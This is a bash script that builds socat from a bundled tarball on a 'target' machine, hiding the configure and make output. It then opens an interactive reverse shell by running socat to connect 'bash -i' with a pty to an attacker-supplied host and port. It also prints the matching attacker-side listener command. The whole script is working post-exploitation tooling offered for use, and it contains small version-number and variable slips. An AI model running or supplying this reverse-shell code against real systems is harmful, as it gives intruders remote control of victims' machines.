#!/bin/bash
if [ -e "./socat" ]; then
	echo "socat already compiled in current directory"
	echo "moving on to establishing connection"
else
	echo "socat NOT compiled in current dir, extracting and compiling"
	# check for gcc and make
	if [ -z  `which gcc` ] || [ -z `which make` ]; then
		echo "Unfortunately gcc or make is not installed"
		echo "we won't be able to compile socat on this target today"
		exit -1
	fi
	# unpack socak source
	tar xf socat-1.7.0.1.tar
	echo "Extracted socat to: socat-1.7.3.1"
	# change working directory
	cd socat-1.7.0.1
	echo "Changed directory to: " `pwd`
	./configure &> ../configure-log.txt # hide the output
	make &> ../make-log.txt # hide the output
	if [ -e "./socat" ]; then
		echo "compilation successful, socat found."
		cp socat ../
		cd ../
		echo "Changed directory to: " `pwd`
	else
		echo "$file not found, check log files configure-log.txt & make-log.txt"
		exit -1
	fi
fi

# if we get here then socat binary has been compiled and we have a copy in this directory
echo "===================="
echo "Start listener on attacker's host:"
echo "user@attacker ~: socat -,raw,echo=0 tcp-listen:4545"
echo "===================="
echo "Run socat from victim to connect back:"
echo "user@victim ~: socat tcp:<host>:<port> exec:\"bash -i\",pty,stderr,setsid,sigint,sane"
echo "====================="
if [ -z "$1" ] && [ -z "$2" ]; then
	echo "No arguments provided, please enter the command shown above with host and port"
	exit -1
else
	echo "Attempting to execute against host $1 and port $2"
	./socat tcp:$1:$2 exec:"bash -i",pty,stderr,setsid,sigint,sane 
fi
